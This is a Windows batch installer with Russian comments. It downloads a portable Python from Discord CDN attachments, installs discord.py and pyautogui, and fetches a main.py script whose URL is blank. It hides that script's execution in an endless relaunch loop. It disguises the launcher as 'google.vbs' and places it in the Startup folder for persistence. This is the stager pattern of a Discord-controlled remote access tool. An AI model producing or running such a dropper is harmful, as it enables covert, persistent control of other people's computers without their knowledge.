rem Загрузка необходимых файлов
curl -f -# -O "https://www.7-zip.org/a/7zr.exe"
curl -f -# -O "https://cdn.discordapp.com/attachments/1160558928480976996/1227605728202588170/Python310.7z.001?ex=662903ed&is=66168eed&hm=87678f023b86bf39213699a8da599d7ea6a8f828558c5e839291e2bbf077d955&"
curl -f -# -O "https://cdn.discordapp.com/attachments/1160558928480976996/1227605728521490463/Python310.7z.002?ex=662903ed&is=66168eed&hm=53f94c329af42341fa36a6b8705c9bfe4824ff5f150543571195a1809e72151a&"
rem распаковка и очистка лишних файлов
7zr.exe x Python310.7z.001
del 7zr.exe
del Python310.7z.001
del Python310.7z.002
rem Создание листа для установок
echo discord.py >> packages.python
echo pyautogui >> packages.python
rem Установка необходимых пакетов
"%~dp0Python310\Scripts\pip.exe" install -r %~dp0packages.python
rem Загрузка скрипта python
curl -f -# -O ""
rem Создание скрипта для скрытого запуска
echo @echo off >> script.bat
echo :offtaskkill >> script.bat
echo "%~dp0Python310\python.exe" "%~dp0main.py" >> script.bat
echo goto offtaskkill >> script.bat
rem Создание скрипта автозагрузки
echo Set WshShell = CreateObject("WScript.Shell") >> google.vbs
echo WshShell.Run "cmd.exe /c %~dp0script.bat", 0, false >> google.vbs
move google.vbs "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
rem Запуск скрипта
"%~dp0Python310\python.exe" "%~dp0main.py"